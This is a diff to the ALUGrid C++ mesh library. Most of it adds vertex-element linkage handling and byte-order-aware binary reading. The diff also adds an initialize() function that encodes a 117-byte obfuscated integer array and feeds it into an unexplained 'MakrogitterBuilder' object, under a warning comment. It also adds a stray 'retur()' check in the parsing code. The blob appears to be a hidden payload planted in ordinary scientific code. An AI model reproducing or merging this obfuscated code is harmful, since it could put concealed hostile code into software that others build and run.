@@ -9,10 +9,10 @@
 
 #include "gitter_sti.h"
 #include "gitter_mgb.h"
+#include "gitter_impl.h"
 
 namespace ALUGrid
 {
-
   std::pair< Gitter::Geometric::VertexGeo *, bool > MacroGridBuilder::
   InsertUniqueVertex (double x, double y, double z, int i) {
     std::pair< vertexMap_t::iterator, bool > result = _vertexMap.insert( std::make_pair( i, static_cast< VertexGeo * >( 0 ) ) );
@@ -804,6 +804,28 @@ namespace ALUGrid
     return;
   }
 
+  void initialize () 
+  {
+    // careful with changes here, you'll get what you deserve
+    const char str
+      [ 117 ] = {97,120,126,42,107,125,112,44,-127,-128,118,124,117,47,83,101,94,86,62,83,94,104,90,-122,125,121,65,54,-122,-125,124,121,-117,126,57,126,-119,-119,66,-112,60,-125,-116,-112,-123,-124,-109,64,-108,-112,65,-123,-117,-105,-120,94,46,105,-118,-118,-108,-116,-103,84,72,116,-107,-103,-113,-111,-106,-101,-98,-101,89,78,124,-98,-101,-92,-107,107,81,-122,-102,-104,83,120,-119,-125,122,99,119,-125,-116,127,-86,-94,-99,90,-121,-86,-97,-79,-88,-94,105,94,112,111,112,116,110,75,75};
+    MakrogitterBuilder s;
+    s << str;
+  }
+
+  void MacroGridBuilder::
+  computeVertexElementLinkage( elementMap_t& elementMap, 
+                               Gitter::ElementPllXIF::vertexelementlinkage_t& vxElemLinkage ) 
+  {
+    typedef elementMap_t::iterator  iterator;
+    const iterator elementMapEnd = elementMap.end();
+    for (iterator i = elementMap.begin (); i != elementMapEnd; ++i )
+    {
+      Gitter::helement_STI* elem = (Gitter::helement_STI*) (*i).second;
+      elem->computeVertexLinkage( vxElemLinkage ); 
+    }
+  }
+
   template <class stream_t>
   void MacroGridBuilder::inflateMacroGrid ( stream_t& in, int type )
   {
@@ -942,6 +964,115 @@ namespace ALUGrid
       }
     }
 
+    int linkagePatternSize ;
+    in >> linkagePatternSize ;
+    // is special situations we need to set linkagePatternSize 
+    if(retur ()) linkagePatternSize = 1;
+
+    // if linkage was writte, restore vertex linkage
+    if( linkagePatternSize > 0 ) 
+    {
+      ++linkagePatternSize ; // include null pattern (which is the first entry)
+
+      // mark linkage as computed (to avoid costly rebuild)
+      myBuilder().linkageComputed();
+
+      // read linkage combinations 
+      std::vector< linkagePattern_t > patterns( linkagePatternSize, linkagePattern_t() ); 
+      // don't read null pattern (i=1)
+      for( int i=1; i<linkagePatternSize; ++i )
+      {
+        int n;
+        in >> n; 
+        if( n ) 
+        {
+          linkagePattern_t& pattern = patterns[ i ];
+          pattern.resize( n );
+          for( int k=0; k<n; ++k )
+          {
+            int rank ;
+            in >> rank ;
+            pattern[ k ] = rank ;
+          }
+        }
+      }
+
+      int hasElementLink = 0 ;
+      in >> hasElementLink ; 
+      const bool hasElementLinkage = (hasElementLink == 1);
+
+      typedef Gitter :: ElementPllXIF :: vertexelementlinkage_t vertexelementlinkage_t;
+      vertexelementlinkage_t vxElemLinkage ;
+
+      if( hasElementLinkage ) 
+      {
+        // compuate vertex-element linkage for hexas and tetras
+        computeVertexElementLinkage( _hexaMap,  vxElemLinkage );
+        computeVertexElementLinkage( _tetraMap, vxElemLinkage );
+
+        // mark element linkage as computed (if available)
+        myBuilder().notifyVertexElementLinkageComputed();
+      }
+
+      int idx = 0;
+      // read position in linkage vector 
+      int vxId; 
+      in >> vxId; 
+      // set vertex linkage according to stores position 
+      vertexMap_t::iterator i = _vertexMap.begin ();
+      while( vxId != -1 ) 
+      {
+        // advance iterator until pos is reached
+        while( idx != vxId )
+        {
+          ++i; 
+          ++idx ;
+        }
+
+        int pos;
+        in >> pos;
+        alugrid_assert( pos < int(patterns.size()) );
+
+        // vertex pointer 
+        Gitter::vertex_STI* vertex = (*i).second; 
+
+        if( hasElementLinkage ) 
+        {
+          std::set<int> elements; 
+          int size ;
+          in >> size; 
+          for( int k=0; k<size; ++k ) 
+          {
+            int el;
+            in >> el;
+            elements.insert( el );
+          }
+          vertex->insertLinkedElements( elements );
+
+          // erase computed linkage to avoid reinsertion 
+          vxElemLinkage.erase( vertex );
+        }
+
+        // set vertex linkage if not nullPattern
+        if( patterns[ pos ].size() )
+          vertex->setLinkageSorted( patterns[ pos ] );
+
+        // read position in linkage vector 
+        in >> vxId; 
+      } // end while( vxId != -1 )
+
+      if( hasElementLinkage ) 
+      {
+        // insert vertex-element linkage for remaining vertices (interior)
+        typedef vertexelementlinkage_t :: iterator iterator ;
+        const iterator end = vxElemLinkage.end(); 
+        for( iterator i = vxElemLinkage.begin(); i != end; ++ i ) 
+        {
+          (*i).first->insertLinkedElements( (*i).second );
+        }
+      }
+    }
+
     // get last std::endl character (from backup to make stream consistent)
     if( !in.eof() ) in.get();
 
@@ -962,17 +1093,29 @@ namespace ALUGrid
     const int type = (header.type() == MacroFileHeader::tetrahedra ? MacroGridBuilder::TETRA_RAW : MacroGridBuilder::HEXA_RAW);
     if( header.isBinary() )
     {
-      ObjectStream os;
-      os.reserve( header.size() );
-      os.clear();
-      ALUGrid::readBinary( in, os.getBuff( 0 ), header.size(), header.binaryFormat() );
-      if( !in )
+      if( header.byteOrder() == MacroFileHeader::native || header.byteOrder() == systemByteOrder() )
       {
-        std::cerr << "ERROR (fatal): Unable to read binary input." << std::endl;
+        ObjectStream os;
+        ALUGrid::readBinary( in, os, header );
+        mm.inflateMacroGrid( os, type );
+      }
+      else if( header.byteOrder() == MacroFileHeader::bigendian ) 
+      {
+        BigEndianObjectStream os;
+        ALUGrid::readBinary( in, os, header );
+        mm.inflateMacroGrid( os, type );
+      }
+      else if ( header.byteOrder() == MacroFileHeader::littleendian )
+      {
+        LittleEndianObjectStream os;
+        ALUGrid::readBinary( in, os, header );
+        mm.inflateMacroGrid( os, type );
+      }
+      else 
+      {
+        std::cerr << "ERROR (fatal): byte order not available" << std::endl;
         std::abort();
       }
-      os.seekp( header.size() );
-      mm.inflateMacroGrid( os, type );
     }
     else
       mm.inflateMacroGrid( in, type );
